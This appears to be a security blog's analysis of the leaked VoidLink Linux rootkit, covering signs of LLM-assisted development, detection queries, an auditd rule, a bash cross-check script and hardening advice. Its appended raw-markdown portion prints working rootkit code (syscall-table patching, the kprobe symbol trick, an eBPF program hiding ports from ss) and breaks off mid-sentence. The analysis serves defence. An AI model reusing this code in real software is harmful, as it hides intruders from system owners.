<p>Every source file in the dump uses the same Unicode box-drawing header (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">═══</code>) to separate sections. This decorative formatting is a hallmark of LLM-generated code. Human kernel developers almost universally use simple <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/* */</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">//</code> comment blocks for section headers. The consistency of this formatting across files written at different times and for different kernel versions suggests that each file was generated or heavily modified by the same LLM.</p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ebpf_test/</code> directory provides perhaps the most vivid evidence. It contains <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hide_ss.bpf.c</code> through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hide_ss_v9.bpf.c</code>, with matching <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">loader.c</code> through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">loader_v9.c</code>. Each version makes incremental improvements over the last, and several contain commented-out &quot;approach&quot; annotations that read like chain-of-thought reasoning:</p>
<pre><code>// Approach tried: don&#x27;t modify return value, only record
// Approach 2: return -ENOMEM to make caller skip
if (data-&gt;should_hide &amp;&amp; regs-&gt;ax == 0) {
    // Try: return -EAGAIN, make caller think temporary error, skip entry
    regs-&gt;ax = (unsigned long)(-EAGAIN);
}</code></pre>
<p>These &quot;Approach 1 / Approach 2 / try this&quot; annotations look like LLM reasoning traces left in the output, where the model discusses different strategies before implementing one.</p>
<p>Despite the strong LLM fingerprints, VoidLink is clearly not a pure LLM creation. Several pieces of evidence confirm human involvement in the development process. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">icmp_ctl.py</code> usage examples contain real Alibaba Cloud IP addresses (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">8.149.128[.]10</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">116.62.172[.]147</code>), indicating operational use on actual targets. Compiled <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.ko</code> files are available for specific kernel versions, demonstrating that the code was tested on real systems. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">load_lkm.sh</code> boot script, with its <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">memfd</code> scanning logic, reveals integration with a broader attack toolkit that a pure LLM session wouldn’t produce. And the 10 iterative eBPF versions in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ebpf_test/</code> show genuine debugging and testing cycles, not just prompt engineering.</p>
<p>These code-level observations align with Check Point&#x27;s macro-level findings. Where Check Point recovered the sprint planning documents and TRAE IDE artifacts showing a specification-driven development workflow, our data dump reveals the other side of the same coin: the iterative prompt-test-refine cycles that produced each rootkit component. The most likely development model was a human-LLM collaboration: The operator defined requirements and tested on real systems, while the LLM generated initial implementations and iterated on fixes in response to error reports. This development pattern is significant because it lowers the barrier to entry for kernel-level rootkit development. An operator who understands the concepts but lacks the kernel programming expertise to implement them from scratch can now produce functional, multigeneration rootkits by iterating with an LLM.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="detecting-voidlinks-rootkits" class="absolute -top-32"></span>Detecting VoidLink’s rootkits</h2>
<p>Despite VoidLink&#x27;s multilayered evasion capabilities, several detection strategies are available. The rootkit&#x27;s thoroughness creates opportunities: Each component, the LKM, the eBPF program, the ICMP channel, and the boot loader, leaves distinct artifacts that defenders can monitor. Because the rootkit actively filters files such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/kallsyms</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/modules</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/sys/kernel/debug/kprobes/list</code>, some of the detection strategies below should be validated in a trusted environment, such as a live boot medium or a kernel with verified integrity.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="module-integrity-detection" class="absolute -top-32"></span>Module integrity detection</h3>
<p>VoidLink removes itself from the kernel&#x27;s module linked list (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">list_del_init</code>), making it invisible to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">lsmod</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/modules</code>. However, the module&#x27;s sysfs entries under <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/sys/module/</code> may persist, depending on the variant. Comparing the output of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">lsmod</code> against <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ls /sys/module/</code> can reveal discrepancies. Additionally, the absence of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">amd_mem_encrypt</code> on systems without AMD hardware or without SME/SEV support is a strong indicator.</p>
<p>The following Event Query Language (EQL) query detects kernel module loading events using the default installed utilities:</p>
<pre><code>process where event.type == &quot;start&quot; and event.action == &quot;exec&quot; and (
  (
    process.name == &quot;kmod&quot; and
    process.args == &quot;insmod&quot; and
    process.args like~ &quot;*.ko*&quot;
  ) or
  (
    process.name == &quot;kmod&quot; and
    process.args == &quot;modprobe&quot; and
    not process.args in (&quot;-r&quot;, &quot;--remove&quot;)
   ) or
  (
    process.name == &quot;insmod&quot; and
    process.args like~ &quot;*.ko*&quot;
   ) or
  (
    process.name == &quot;modprobe&quot; and
    not process.args in (&quot;-r&quot;, &quot;--remove&quot;)
  )
)</code></pre>
<p>The loading of the kernel module is detectable through Auditd Manager by applying the following configuration:</p>
<pre><code>-a always,exit -F arch=b64 -S finit_module -S init_module -S delete_module -F auid!=-1 -k modules
-a always,exit -F arch=b32 -S finit_module -S init_module -S delete_module -F auid!=-1 -k modules</code></pre>
<p>And using the following query:</p>
<pre><code>driver where host.os.type == &quot;linux&quot; 
and event.action == &quot;loaded-kernel-module&quot; 
and auditd.data.syscall in (&quot;init_module&quot;, &quot;finit_module&quot;)</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="ftrace-hook-detection" class="absolute -top-32"></span>Ftrace hook detection</h3>
<p>VoidLink&#x27;s ftrace hooks can be discovered by inspecting the kernel&#x27;s tracing infrastructure. The file <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/sys/kernel/debug/tracing/enabled_functions</code> lists all active ftrace hooks. Unexpected hooks on functions like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__x64_sys_getdents64</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vfs_read</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">do_send_sig_info</code>, or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__x64_sys_statx</code> are highly suspicious. Note that VoidLink&#x27;s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vfs_read</code> hook filters this file, so inspection from a trusted kernel is recommended.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="ebpf-program-detection" class="absolute -top-32"></span>eBPF program detection</h3>
<p>The eBPF companion can be detected through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bpftool prog list</code>, which enumerates all loaded BPF programs. Kprobe and kretprobe programs attached to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">__sys_recvmsg</code> are unusual in production environments and warrant investigation. Pinned BPF maps under <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/sys/fs/bpf/</code> (used by the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ebpf_hide</code> variant) are another indicator.</p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bpf_probe_write_user</code> helper facilitates direct writes from kernel-space eBPF programs into userland memory. Although designed for debugging, rootkits can exploit this functionality. Consequently, monitoring for instances of this helper&#x27;s use presents a detection opportunity. This detection requires the collection of raw syslog data and the implementation of specific detection rules, as outlined below:</p>
<pre><code>event.dataset:&quot;system.syslog&quot; and process.name:&quot;kernel&quot; and
message:&quot;bpf_probe_write_user&quot;</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="behavioral-cross-referencing" class="absolute -top-32"></span>Behavioral cross-referencing</h3>
<p>One of the most effective detection strategies doesn’t rely on inspecting the rootkit&#x27;s artifacts directly but instead cross-references different views of the system for inconsistencies. Compare the output of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ps aux</code> against a raw listing of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/</code> directory entries. Compare <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">netstat -tlnp</code> against <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss -tlnp</code> against a direct read of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/net/tcp</code>. If VoidLink&#x27;s eBPF component isn’t loaded (or if the LKM and eBPF hide lists are out of sync), connections visible in one view but not another indicate rootkit activity.</p>
<p>A simple (generated) comparison script can automate this:</p>
<pre><code>#!/bin/bash
# Behavioral cross-referencing: detect hidden processes and network connections
# by comparing multiple views of the same system state.

set -euo pipefail

echo &quot;=== Process cross-reference ===&quot;
ps_count=$(ps aux --no-header | wc -l)
proc_count=$(ls -d /proc/[0-9]* 2&gt;/dev/null | wc -l)
echo &quot;ps reports $ps_count processes, /proc has $proc_count entries&quot;

if [ &quot;$ps_count&quot; -ne &quot;$proc_count&quot; ]; then
    echo &quot;[!] MISMATCH — possible hidden or spoofed processes&quot;
    ps aux --no-header | awk &#x27;{print $2}&#x27; | sort -n &gt; /tmp/.ps_pids
    ls -d /proc/[0-9]* 2&gt;/dev/null | xargs -n1 basename | sort -n &gt; /tmp/.proc_pids
    diff /tmp/.ps_pids /tmp/.proc_pids || true
    rm -f /tmp/.ps_pids /tmp/.proc_pids
else
    echo &quot;[OK] Process counts match&quot;
fi

echo &quot;&quot;
echo &quot;=== Network cross-reference ===&quot;

# Method 1: ss (iproute2 — always available on modern Linux)
# -t = TCP, -l = listening, -n = numeric, no -p (needs root)
ss_port_nums=$(ss -tln | awk &#x27;NR&gt;1{print $4}&#x27; | grep -oP &#x27;\d+$&#x27; | sort -un)

# Method 2: Parse /proc/net/tcp directly (kernel-level view)
# Filter for state 0A (LISTEN), extract hex port, convert via shell printf
proc_ports=$(
    awk &#x27;NR&gt;1 &amp;&amp; $4 == &quot;0A&quot; {split($2, a, &quot;:&quot;); print a[2]}&#x27; \
        /proc/net/tcp /proc/net/tcp6 2&gt;/dev/null \
    | while read -r hex; do printf &quot;%d\n&quot; &quot;0x$hex&quot;; done \
    | sort -un
)

echo &quot;ss listening ports      : $(echo &quot;$ss_port_nums&quot; | tr &#x27;\n&#x27; &#x27; &#x27;)&quot;
echo &quot;/proc/net/tcp listening : $(echo &quot;$proc_ports&quot; | tr &#x27;\n&#x27; &#x27; &#x27;)&quot;

diff_result=$(diff &lt;(echo &quot;$ss_port_nums&quot;) &lt;(echo &quot;$proc_ports&quot;) || true)
if [ -z &quot;$diff_result&quot; ]; then
    echo &quot;[OK] Network views match&quot;
else
    echo &quot;[!] MISMATCH — possible hidden connections:&quot;
    echo &quot;$diff_result&quot;
fi</code></pre>

<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="defensive-recommendations" class="absolute -top-32"></span>Defensive recommendations</h3>
<p>Defending against rootkits like VoidLink requires a multilayered approach that goes beyond traditional endpoint protection. Secure Boot and kernel module signing should be enforced to prevent unauthorized kernel modules from loading. The kernel lockdown mode, available since Linux 5.4, restricts operations such as direct memory access and unsigned module loading, even for root users. Monitor the Auditd subsystem for <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init_module</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">finit_module</code> syscalls, as any unexpected kernel module load on a production server warrants immediate investigation.</p>
<p>For eBPF specifically, consider restricting the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bpf()</code> syscall to specific processes using seccomp profiles or LSM policies. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bpf_probe_write_user</code> helper, which VoidLink abuses to modify userspace memory from eBPF programs, is a known high-risk primitive. Systems that don’t require eBPF-based debugging should consider disabling it entirely through sysctl (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kernel.unprivileged_bpf_disabled=1</code>).</p>
<p>Regular integrity checks that cross-reference different system views (process listings, network connections, module lists) from userspace and from a trusted kernel can reveal rootkit activity even when individual views are compromised. Kernel memory forensics tools that can scan for known rootkit patterns, such as ftrace hooks on suspicious functions or Netfilter hooks processing ICMP traffic, provide another layer of defense.</p>

<h2 class="font-bold text-2xl md:text-4xl relative"><span id="conclusion" class="absolute -top-32"></span>Conclusion</h2>
<p>Check Point Research&#x27;s publications on VoidLink revealed the scope and ambition of the broader framework: a cloud-native, modular C2 platform with over 30 plugins, adaptive stealth, and multiple transport channels. Our analysis of the leaked rootkit source code complements those findings by providing a deep technical look at the kernel-level subsystem that underpins VoidLink&#x27;s concealment capabilities. The hybrid LKM-eBPF architecture, spanning four generations of iterative development, demonstrates both technical ambition and practical operational awareness, producing a rootkit capable of comprehensive stealth across multiple kernel versions, from CentOS 7&#x27;s kernel 3.10 through Ubuntu 22.04&#x27;s kernel 6.2.</p>
<p>Several aspects of VoidLink stand out as particularly noteworthy. The eBPF Netlink buffer manipulation technique for <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ss</code> hiding is rarely documented and represents a creative application of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bpf_probe_write_user</code> that defenders should be aware of. The delayed initialization strategy evades synchronous module-load security checks, a technique uncommon in the wild and indicative of an understanding of modern EDR behavior. The runtime ICMP credential rotation adds an operational security layer, making network signature-based detection a moving target.</p>
<p>The evidence of LLM-assisted development, both at the project-planning level, documented by Check Point, and at the code-iteration level, visible in our data dump, is perhaps the most significant finding for the threat landscape as a whole. Together, these analyses demonstrate that operators with moderate Linux knowledge can produce kernel-level rootkits by iterating with an AI assistant, lowering a barrier that previously required years of kernel development expertise. As LLMs continue to improve, we expect this pattern to accelerate, making rootkit development accessible to a broader range of threat actors.</p>
<p>We’ll continue to monitor for VoidLink deployments and variants and will update our detection rules as new indicators emerge.</p></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm The `icmp_ctl.py` usage examples referenced two Alibaba Cloud IP addresses, `8.149.128[.]10` and `116.62.172[.]147`, indicating that VoidLink was being used operationally against targets accessible from Chinese cloud infrastructure. The `load_lkm.sh` boot script hard-codes a path to `/root/kernel5x_new/vl_stealth.ko` and configures port `8080` to be hidden by default, further suggesting active deployment.\n\n## Architecture: A hybrid approach\n\nWhat makes VoidLink architecturally notable is its two-component design. Most Linux rootkits rely on a single mechanism for hiding, whether that’s an LKM hooking syscalls, an eBPF program attached to tracepoints, or a shared object injected via `LD_PRELOAD`. VoidLink uses both an LKM and an eBPF program, each handling the task for which it is best suited. This hybrid approach is rarely seen in the wild and reflects a deliberate engineering decision.\n\nThe LKM component, which masquerades under the module name `vl_stealth` (or, in some variants, `amd_mem_encrypt`), is the backbone of the rootkit. It handles tasks that require deep kernel access: process hiding via `getdents64` syscall hooking, file and module trace removal via `vfs_read` filtering, network connection hiding via `seq_show` kretprobes, and the ICMP-based command-and-control channel via Netfilter hooks. These operations require manipulating kernel-internal data structures and intercepting kernel functions at a level that only a loaded kernel module can achieve.\n\nThe eBPF component handles a single but critical task: hiding network connections from the `ss` utility. The `ss` command doesn’t read from `/proc/net/tcp` as `netstat` does. Instead, it uses Netlink sockets with the `SOCK_DIAG_BY_FAMILY` protocol to query the kernel's socket diagnostic interface directly. This means that the kretprobe technique used to hide connections from `netstat`, which works by rolling back the `seq_file` output counter, has no effect on `ss`.\n\nThe developers initially attempted to hide connections from `ss` using a kretprobe on `inet_sk_diag_fill`, returning `-EAGAIN` to suppress individual entries. A comment in the source code, translated from Chinese, explains why they abandoned this approach: \"ss command hiding implemented by eBPF module (more stable)\". The kretprobe method caused kernel instability, likely because `inet_sk_diag_fill` is called deep within the Netlink socket processing path, and returning an error code there could corrupt the response chain.\n\nThe eBPF solution is elegant. It hooks `__sys_recvmsg` using a kprobe at the entry point and a kretprobe at the return point. On entry, it captures the userspace receive buffer address from the `msghdr` structure. On return, it walks the chain of `nlmsghdr` structures in that buffer, checking each `SOCK_DIAG_BY_FAMILY` message for hidden source or destination ports. When it finds a match, rather than removing the entry (which would corrupt the Netlink message chain), it extends the previous message's `nlmsg_len` field to absorb the hidden entry. The `ss` parser then treats the hidden entry as padding within the previous message and silently skips it. This \"swallowing\" technique, implemented through `bpf_probe_write_user`, is a creative abuse of a BPF helper originally intended for debugging.\n\n## Version evolution\n\nVoidLink evolved through at least four generations, each one adapting to newer kernel defenses while expanding the rootkit's capabilities. The rootkit calls it directly to resolve function addresses. However, the kernel marks the syscall table as read-only, so modifying it requires temporarily disabling the processor's write protection bit in the `CR0` control register:\n\n```c\nwrite_cr0(read_cr0() \u0026 ~X86_CR0_WP);  // Disable write protection\nsys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;\nsys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;\nwrite_cr0(read_cr0() | X86_CR0_WP);   // Re-enable write protection\n```\n\nThis is a well-known technique with a long history in Linux rootkit development. More interestingly, how does the CentOS 7 variant handle GCC's interprocedural optimizations? When GCC inlines or clones functions, it renames them with suffixes like `.isra.0`, `.constprop.5`, or `.part.3`. This means a symbol like `tcp4_seq_show` might actually exist in the kernel as `tcp4_seq_show.isra.2`. VoidLink's `find_symbol_flexible()` function handles this by brute-forcing up to 20 variants of each suffix:\n\n```c\nstatic unsigned long find_symbol_flexible(const char *base_name)\n{\n    unsigned long addr;\n    char buf[128];\n    int i;\n\n    addr = kallsyms_lookup_name(base_name);\n    if (addr) return addr;\n\n    for (i = 0; i \u003c= 20; i++) {\n        snprintf(buf, sizeof(buf), \"%s.isra.%d\", base_name, i);\n        addr = kallsyms_lookup_name(buf);\n        if (addr) return addr;\n    }\n\n    for (i = 0; i \u003c= 20; i++) {\n        snprintf(buf, sizeof(buf), \"%s.constprop.%d\", base_name, i);\n        addr = kallsyms_lookup_name(buf);\n        if (addr) return addr;\n    }\n\n    return 0;\n}\n```\n\nAnyone who has developed kernel modules for CentOS 7 will recognize the frustration of symbols being renamed by compiler optimizations. The fact that VoidLink handles this systematically, across `.isra`, `.constprop`, and `.part` suffixes, suggests the developers encountered this problem during real-world deployment.\n\nThe CentOS 7 variant hooks both `getdents` and `getdents64` syscalls, because CentOS 7 userspace tools use both 32-bit and 64-bit directory entry formats. The `/proc/modules` file is handled separately by replacing the `seq_operations.show` function pointer after opening the file through `filp_open()`. This generation also introduces the anti-debugging timer and the self-destruct command, features that persist through all subsequent generations. One notable detail: The variant suppresses all kernel log output by redefining `pr_info`, `pr_err`, and `pr_warn` as no-ops, a simple but effective anti-forensics measure.\n\n### Generation 2: Adapting to kernel 5.x\n\nThe jump from CentOS 7's kernel 3.10 to kernel 5.x required fundamental changes to VoidLink's hooking strategy. Two kernel developments forced the developers' hand: `kallsyms_lookup_name()` was unexported starting in kernel 5.7, and the syscall table gained stronger write protections through `CONFIG_STRICT_KERNEL_RWX`.\n\nThe second generation, found in `stealth_kernel5x.c` and `lkm_test/main.c`, addresses the first problem with a technique known in rootkit development circles as the *kprobe trick*. Instead of calling `kallsyms_lookup_name()` directly, the rootkit registers a kprobe on it. The kernel's kprobe subsystem resolves the symbol address internally during registration and stores it in the `kp.addr` field. The rootkit reads this address and then immediately unregisters the kprobe:\n\n```c\nstatic int init_symbols(void)\n{\n    struct kprobe kp = { .symbol_name = \"kallsyms_lookup_name\" };\n    if (register_kprobe(\u0026kp) \u003c 0)\n        return -EFAULT;\n    kln_func = (kln_t)kp.addr;\n    unregister_kprobe(\u0026kp);\n    return kln_func ? 0 : -EFAULT;\n}\n```\n\nThis trick was first popularized by modern rootkits, like Diamorphine, and has become the de facto method for symbol resolution on post–5.7 kernels. Once `kallsyms_lookup_name` is available, the rootkit can resolve any other kernel symbol it needs.\n\nFor syscall hooking, Generation 2 abandons direct modification of the syscall table in favor of ftrace. The Linux kernel's function tracing framework was designed for performance analysis and debugging, but it provides a convenient API for attaching callbacks to arbitrary kernel functions. VoidLink registers ftrace hooks on `__x64_sys_getdents64` and `vfs_read`, using `FTRACE_OPS_FL_SAVE_REGS` and `FTRACE_OPS_FL_IPMODIFY` flags to gain full control over the hooked function's execution. The ftrace callback modifies the instruction pointer in the saved register state, redirecting execution to the rootkit's handler before the original function runs.\n\nThis generation also introduces `vfs_read` hooking to filter sensitive pseudo-files. When a process reads `/proc/kallsyms`, `/proc/modules`, or `/sys/kernel/debug/kprobes/list`, the rootkit intercepts the output buffer and removes any lines containing the module name or kretprobe registrations. This is a significant improvement over the CentOS 7 variant's approach of hooking `seq_operations.show` for a single file; the `vfs_read` hook provides a centralized filtering mechanism for all sensitive files.\n\n### Generation 3: Production readiness\n\nThe third generation, found in `kernel5x_new/` and `lkm_5x/`, represents the production-ready form of VoidLink. The most visible change is the addition of module parameters that allow the operator to configure the rootkit at load time without needing the ICMP channel:\n\n```shell\ninsmod vl_stealth.ko init_pids=1234 init_ports=8080 stealth=1\n```\n\nThe `init_pids` parameter specifies process IDs to hide immediately after loading. The `init_ports` parameter lists ports to hide from `netstat` and `ss`. The `stealth` flag controls whether the module removes itself from the kernel's module list upon initialization. These parameters eliminate the need for a separate ICMP command to configure the rootkit after it loads, thereby reducing the window of vulnerability between module insertion and activation.\n\nThis generation also doubles the number of ICMP hook registrations by attaching to both the `NF_INET_PRE_ROUTING` and `NF_INET_LOCAL_IN` Netfilter chains. The dual registration ensures reliable command reception, regardless of the host's network configuration and iptables rules. Most rootkits register on only one Netfilter chain; VoidLink's dual approach demonstrates an awareness of operational failures that could occur in diverse network environments.\n\nThe most important change in Generation 3 is the delegation of `ss` hiding to the eBPF companion, which we will examine in detail shortly.\n\n## The eBPF innovation: Hiding from ss\n\nOne of the most technically interesting aspects of VoidLink is how it hides network connections from the `ss` utility. This problem has historically been a challenge for Linux rootkits because `ss` and `netstat` query the kernel through entirely different interfaces, meaning a rootkit that defeats one often fails against the other.\n\nThe `netstat` utility reads from `/proc/net/tcp`, `/proc/net/tcp6`, `/proc/net/udp`, and similar pseudo-files. The kernel generates these files via `seq_file` operations, calling functions such as `tcp4_seq_show()` for each socket entry. Hiding a connection from `netstat` is straightforward: Install a kretprobe on the relevant `seq_show` function and, when it returns, check whether the source or destination port matches a hidden port. If it does, roll back the `seq_file-\u003ecount` counter to its pre-call value, effectively erasing the line from the output. VoidLink's LKM component uses exactly this approach for `netstat` hiding, and it works reliably.\n\nThe `ss` utility, however, uses the `SOCK_DIAG_BY_FAMILY` Netlink interface to query socket information directly from the kernel. The response arrives as a chain of Netlink messages (`nlmsghdr` structures), each containing an `inet_diag_msg` with socket details. This is a completely different data path from `/proc/net/tcp`, and the `seq_show` kretprobes don’t affect it.\n\nThe `ebpf_test/` directory tells the story of VoidLink's developers struggling to solve this problem. We found 10 sequential versions of `hide_ss.bpf.c` (v1 through v9, plus a \"final\" and \"full\" variant), each one attempting a different approach. The early versions tried to modify Netlink messages in kernel space, which proved unreliable. The later versions converged on the \"swallowing\" strategy used by the production variant.\n\nThe production eBPF program is located in `lkm_5x/ebpf/hide_ss.bpf.c` and hooks `__sys_recvmsg` at both entry and return. On entry, it captures the userspace buffer address from the `msghdr-\u003emsg_iov` chain:\n\n```c\nSEC(\"kprobe/__sys_recvmsg\")\nint kprobe_recvmsg(struct pt_regs *regs)\n{\n    __u32 k = 0;\n    __u8 *e = bpf_map_lookup_elem(\u0026enabled, \u0026k);\n    if (!e || !*e)\n        return 0;\n\n    void *msg = (void *)regs-\u003esi;\n    if (!msg)\n        return 0;\n\n    void *msg_iov;\n    struct iovec iov;\n    if (bpf_probe_read_user(\u0026msg_iov, 8, msg + 16) \u003c 0 || !msg_iov)\n        return 0;\n    if (bpf_probe_read_user(\u0026iov, sizeof(iov), msg_iov) \u003c 0 || !iov.iov_base)\n        return 0;\n\n    __u64 id = bpf_get_current_pid_tgid();\n    struct rctx_data d = { .buf = iov.iov_base, .len = iov.iov_len };\n    bpf_map_update_elem(\u0026recvmsg_ctx, \u0026id, \u0026d, BPF_ANY);\n    return 0;\n}\n```\n\nThe buffer address and length are stored in a per-thread BPF hash map (`recvmsg_ctx`), keyed by the thread's PID/TID combination. This allows the return hook to retrieve the buffer address, even though it’s no longer available in the register state at function return.\n\nThe return hook is where the actual hiding occurs. After verifying that the `recvmsg` call succeeded, it walks the Netlink message chain in the userspace buffer:\n\n```c\nSEC(\"kretprobe/__sys_recvmsg\")\nint kretprobe_recvmsg(struct pt_regs *regs)\n{\n    // ... setup and validation ...\n\n    void *buf = d-\u003ebuf;\n    long offset = 0;\n    long prev_offset = -1;\n    __u32 prev_len = 0;\n\n    #pragma unroll\n    for (int i = 0; i \u003c 32; i++) {\n        if (offset \u003e= ret || offset + NLMSG_HDRLEN \u003e ret)\n            break;\n\n        __u32 nlmsg_len;\n        __u16 nlmsg_type;\n        bpf_probe_read_user(\u0026nlmsg_len, 4, buf + offset);\n        bpf_probe_read_user(\u0026nlmsg_type, 2, buf + offset + 4);\n\n        int should_hide = 0;\n        if (nlmsg_type == SOCK_DIAG_BY_FAMILY) {\n            void *payload = buf + offset + NLMSG_HDRLEN;\n            __u16 sport, dport;\n\n            if (bpf_probe_read_user(\u0026sport, 2, payload + SPORT_OFF) == 0 \u0026\u0026\n                bpf_probe_read_user(\u0026dport, 2, payload + DPORT_OFF) == 0) {\n\n                sport = bpf_ntohs(sport);\n                dport = bpf_ntohs(dport);\n\n                if (bpf_map_lookup_elem(\u0026hidden_ports, \u0026sport) != NULL ||\n                    bpf_map_lookup_elem(\u0026hidden_ports, \u0026dport) != NULL) {\n                    should_hide = 1;\n                }\n            }\n        }\n\n        if (should_hide) {\n            if (prev_offset \u003e= 0) {\n                __u32 new_len = prev_len + nlmsg_len;\n                bpf_probe_write_user(buf + prev_offset, \u0026new_len, 4);\n            }\n        } else {\n            prev_offset = offset;\n            prev_len = nlmsg_len;\n        }\n\n        offset += NLMSG_ALIGN(nlmsg_len);\n    }\n    // ...\n}\n```\n\nFor each Netlink message of type `SOCK_DIAG_BY_FAMILY`, the program reads the source and destination ports from fixed offsets within the `inet_diag_msg` payload (offsets 4 and 6, respectively). If either port matches an entry in the `hidden_ports` BPF map, the 